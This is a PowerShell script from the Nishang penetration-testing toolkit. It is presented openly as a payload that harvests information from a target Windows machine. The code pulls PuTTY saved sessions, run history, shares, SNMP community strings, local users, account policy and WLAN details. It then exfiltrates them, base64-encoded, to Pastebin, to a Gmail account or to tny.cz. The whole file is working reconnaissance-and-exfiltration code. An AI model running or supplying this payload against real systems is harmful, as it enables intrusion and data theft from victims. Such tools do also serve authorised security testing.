<#
.SYNOPSIS
Nishang Payload which gathers juicy information from the target.

.DESCRIPTION
This payload extracts information form registry and some commands. 
The information can then be exfiltrated using method of choice. The information available would be dependent on the privilege with
which the script would be executed. If pastebin is used, all the info would be base64 encoded to avoid pastebin spam filters.

.PARAMETER exfil
Use this parameter to use exfiltration methods.

.PARAMETER dev_key
The Unique API key provided by pastebin when you register a free account.
Unused for tinypaste.
Unused for gmail option.

.PARAMETER username
Username for the pastebin account where data would be pasted.
Username for the tinypaste account where data would be pasted.
Username for the gmail account where attachment would be sent as an attachment.

.PARAMETER password
Password for the pastebin account where data would be pasted.
Password for the tinypaste account where data would be pasted.
Password for the gmail account where data would be sent.

.PARAMETER keyoutoption
The method you want to use for exfitration of data.
"0" for displaying on console
"1" for pastebin.
"2" for gmail
"3" for tinypaste   

.EXAMPLE
PS > .\Get-Information.ps1

.EXAMPLE
PS > .\Get-Information.ps1 -exfil <devkey> <username> <password> <keyoutoption>

Use above when using the payload from non-interactive shells.

.LINK
http://labofapenetrationtester.blogspot.com/
http://code.google.com/p/nishang
#>


[CmdletBinding(DefaultParameterSetName="noexfil")]
Param ( [Parameter(Parametersetname="exfil")] [Switch] $exfil,
[Parameter(Position = 0, Mandatory = $True, Parametersetname="exfil")] [String] $dev_key,
[Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")] [String]$username,
[Parameter(Position = 2, Mandatory = $True, Parametersetname="exfil")] [String]$password,
[Parameter(Position = 3, Mandatory = $True, Parametersetname="exfil")] [String]$keyoutoption )
function Get-Information 
{
    function registry_values($regkey, $regvalue,$child) 
    { 
        if ($child -eq "no"){$key = get-item $regkey} 
        else{$key = get-childitem $regkey} 
        $key | 
        ForEach-Object { 
        $values = Get-ItemProperty $_.PSPath 
        ForEach ($value in $_.Property) 
        { 
        if ($regvalue -eq "all") {$values.$value} 
        elseif ($regvalue -eq "allname"){$value} 
        else {$values.$regvalue;break} 
        }}} 
   
    $output = "Logged in users:`n" + ((registry_values "hklm:\software\microsoft\windows nt\currentversion\profilelist" "profileimagepath") -join "`r`n") 
    $output = $output + "`n`n Powershell environment:`n" + ((registry_values "hklm:\software\microsoft\powershell" "allname")  -join "`r`n") 
    $output = $output + "`n`n Putty trusted hosts:`n" + ((registry_values "hkcu:\software\simontatham\putty" "allname")  -join "`r`n") 
    $output = $output + "`n`n Putty saved sessions:`n" + ((registry_values "hkcu:\software\simontatham\putty\sessions" "all")  -join "`r`n") 
    $output = $output + "`n`n Recently used commands:`n" + ((registry_values "hkcu:\software\microsoft\windows\currentversion\explorer\runmru" "all" "no")  -join "`r`n") 
    $output = $output + "`n`n Shares on the machine:`n" + ((registry_values "hklm:\SYSTEM\CurrentControlSet\services\LanmanServer\Shares" "all" "no")  -join "`r`n") 
    $output = $output + "`n`n Environment variables:`n" + ((registry_values "hklm:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" "all" "no")  -join "`r`n") 
    $output = $output + "`n`n More details for current user:`n" + ((registry_values "hkcu:\Volatile Environment" "all" "no")  -join "`r`n") 
    $output = $output + "`n`n SNMP community strings:`n" + ((registry_values "hklm:\SYSTEM\CurrentControlSet\services\snmp\parameters\validcommunities" "all" "no")  -join "`r`n") 
    $output = $output + "`n`n SNMP community strings for current user:`n" + ((registry_values "hkcu:\SYSTEM\CurrentControlSet\services\snmp\parameters\validcommunities" "all" "no")  -join "`r`n") 
    $output = $output + "`n`n Installed Applications:`n" + ((registry_values "hklm:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" "displayname")  -join "`r`n") 
    $output = $output + "`n`n Installed Applications for current user:`n" + ((registry_values "hkcu:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" "displayname")  -join "`r`n") 
    $output = $output + "`n`n Domain Name:`n" + ((registry_values "hklm:\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\History\" "all" "no")  -join "`r`n") 
    $output = $output + "`n`n Contents of /etc/hosts:`n" + ((get-content -path "C:\windows\System32\drivers\etc\hosts")  -join "`r`n") 
    $output = $output + "`n`n Running Services:`n" + ((net start) -join "`r`n") 
    $output = $output + "`n`n Account Policy:`n" + ((net accounts)  -join "`r`n") 
    $output = $output + "`n`n Local users:`n" + ((net user)  -join "`r`n") 
    $output = $output + "`n`n Local Groups:`n" + ((net localgroup)  -join "`r`n") 
    $output = $output + "`n`n WLAN Info:`n" + ((netsh wlan show all)  -join "`r`n") 
    $output
    
    $script:pastevalue = $output

}

if($exfil -eq $True)
{
    function Do-Exfiltration
    {
        $paste_name = $env:COMPUTERNAME + ": Information"
        function post_http($url,$parameters) 
        { 
            $http_request = New-Object -ComObject Msxml2.XMLHTTP 
            $http_request.open("POST", $url, $false) 
            $http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
            $http_request.setRequestHeader("Content-length", $parameters.length); 
            $http_request.setRequestHeader("Connection", "close") 
            $http_request.send($parameters) 
            $script:session_key=$http_request.responseText 
        } 

        function Get-MD5()
        {
            #http://stackoverflow.com/questions/10521061/how-to-get-a-md5-checksum-in-powershell
            $md5 = new-object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
            $utf8 = new-object -TypeName System.Text.UTF8Encoding
            $hash = [System.BitConverter]::ToString($md5.ComputeHash($utf8.GetBytes($password))).Replace("-", "").ToLower()
            return $hash
        }

        if ($keyoutoption -eq "0")
        {
            $pastevalue
        }

        elseif ($keyoutoption -eq "1")
        {
            $utfbytes  = [System.Text.Encoding]::UTF8.GetBytes($pastevalue)
            $pastevalue = [System.Convert]::ToBase64String($utfbytes)
            post_http "https://pastebin.com/api/api_login.php" "api_dev_key=$dev_key&api_user_name=$username&api_user_password=$password" 
            post_http "https://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$paste_name&api_paste_code=$pastevalue&api_paste_private=2" 
        }
        
        elseif ($keyoutoption -eq "2")
        {
            #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
            $smtpserver = “smtp.gmail.com”
            $msg = new-object Net.Mail.MailMessage
            $smtp = new-object Net.Mail.SmtpClient($smtpServer )
            $smtp.EnableSsl = $True
            $smtp.Credentials = New-Object System.Net.NetworkCredential(“$username”, “$password”); 
            $msg.From = “$username@gmail.com”
            $msg.To.Add(”$username@gmail.com”)
            $msg.Subject = $paste_name
            $msg.Body = $pastevalue
            if ($filename)
            {
                $att = new-object Net.Mail.Attachment($filename)
                $msg.Attachments.Add($att)
            }
            $smtp.Send($msg)
        }

        elseif ($keyoutoption -eq "3")
        {
            
            $hash = Get-MD5
            post_http "http://tny.cz/api/create.xml" "paste=$pastevalue&title=$paste_name&is_code=0&is_private=1&password=$dev_key&authenticate=$username`:$hash"
        }

    }

    Get-Information
    Do-Exfiltration
}

else
{
    Get-Information
    $pastevalue
}